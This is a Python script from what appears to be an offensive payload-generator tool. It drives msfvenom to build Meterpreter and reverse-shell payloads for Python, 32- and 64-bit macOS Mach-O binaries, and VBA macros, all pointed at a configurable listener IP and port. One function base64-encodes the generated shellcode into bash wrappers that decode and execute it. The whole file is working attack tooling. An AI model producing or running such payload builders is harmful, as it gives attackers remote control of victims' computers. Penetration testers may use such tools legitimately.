#! /usr/bin/env python3
import os
import base64
import subprocess
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()


##  Python Shells
def gen_100():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating Python  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 100-Staged-MET-Python payload -------")
  os.system("msfvenom -p " + m.METPY_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.METPY_PORT + "   >" + m.targetfile +"100-python-met.py")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 101-Staged-SHELL-Python payload -------")
  os.system("msfvenom -p " + m.SHELLPY_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELLPY_PORT + "  >" + m.targetfile +"101-python-shell.py")



##  32 bit MAC  MSFVenom  MeterpreterShell
def gen_200():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating OSX 32bit  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 200 32bit OSX payload -------")
  os.system("msfvenom -p " + m.SHELLOS32_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELLOS32_PORT + " --platform OSX -a x86  -f macho  >" + m.targetfile + "200-OSX-Shell.macho")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 201 32bit OSX VBA payload -------")
  os.system("msfvenom -p " + m.SHELLOS32_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELLOS32_PORT + " --platform OSX -a x86  -f vba  >" + m.targetfile + "201-OSX-Shell.vba")

def gen_201():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating OSX 32bit Python  Payloads NOW!" + m.bcolors.ENDC)
  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} ".format(m.METPY_Payload, m.listener_ip, m.METPY_PORT), shell=True)
  shellcode = shellcode.decode('ascii')
  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 202-MAC-MetPy.sh file...")
  MAC_METPY_file = open(m.targetfile + "202-MAC-MetPy.sh", "w")
  MAC_METPY_file.write("""#!/bin/bash
python -c "$(printf '%s' '{0}' | base64 -D)"
""".format(Shellcode))
  MAC_METPY_file.close()

  shellcode = subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} ".format(m.SHELLPY_Payload, m.listener_ip, m.SHELLPY_PORT), shell=True)
  shellcode = shellcode.decode('ascii')
  Shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 202-MAC-ShellPy.sh file...")
  MAC_shPY_file = open(m.targetfile + "202-MAC-ShellPy.sh", "w")
  MAC_shPY_file.write("""#!/bin/bash
python -c "$(printf '%s' '{0}' | base64 -D)"
""".format(Shellcode))
  MAC_shPY_file.close()

##  64 bit MAC  MSFVenom  MeterpreterShell
def gen_210():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating OSX 64bit  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 210 64bit OSX payload -------")
  os.system("msfvenom -p " + m.SHELLOS64_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELLOS64_PORT + " --platform OSX -a x64  -f macho  >" + m.targetfile + "210-OSX-Shell.macho")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 211 64bit OSX VBA payload -------")
  os.system("msfvenom -p " + m.SHELLOS64_Payload + " LHOST=" + m.listener_ip + " LPORT=" + m.SHELLOS64_PORT + " --platform OSX -a x64 -b  -f vba  >" + m.targetfile + "211-OSX-Shell.vba")

